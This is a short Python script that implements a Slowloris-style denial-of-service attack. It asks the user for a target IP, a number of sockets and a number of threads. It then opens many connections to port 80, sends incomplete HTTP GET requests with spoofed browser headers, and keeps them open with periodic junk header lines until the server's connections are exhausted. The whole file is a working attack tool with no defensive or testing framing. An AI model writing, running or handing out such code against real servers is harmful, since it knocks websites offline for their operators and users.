import socket
import random
import time
import _thread

#run on python shell
ip = str(input("enter IP of target : "))
socknum = int(input("Enter number of sockets : "))
threadss = int(input("Number of threads "))
def slooo_packet_make(ip):    #make socket 
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, 80))
        s.settimeout(4)
        return s
    except socket.error:
        print("socket full !!")
    

def send_data_sloo(sock,headerlist,ip):   #send header and a request,if no socket make socket
    try:
        sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
        for header in headerlist:
            sock.send(bytes("{}\r\n".format(header).encode("utf-8")))
    except AttributeError:
        slooo_packet_make(ip)
        
def pack_alive(sock,headerlist,ip):  #send half request to keep packet alive
        sock.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
        

        
def sock_push(i1,socknum):       #main funtion   get headers from http://www.useragentstring.com/pages/useragentstring.php?name=Netscape
    l=["User-agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1",
    "Accept-language: en-US,en,q=0.5","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1","Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1"]
    k0 = []                #setup sockets 
    for j in range(socknum):
        k = slooo_packet_make(i1)     
        time.sleep(0.01)
        print("set up socket" , j)
        k0.append(k)
        send_data_sloo(k0[j],l,i1)
        pack_alive(k0[j],l,i1)

    while True:     #keep sockets alive
        for m in k0:
            try:
                pack_alive(m,l,i1)
            except socket.error :
                k = slooo_packet_make(i1)
                send_data_sloo(k,l,i1)
                k0.append(k)
        time.sleep(20)

 
for _ in range(threadss):     #do above function for each thread
        _thread.start_new_thread(sock_push,(ip,socknum,))
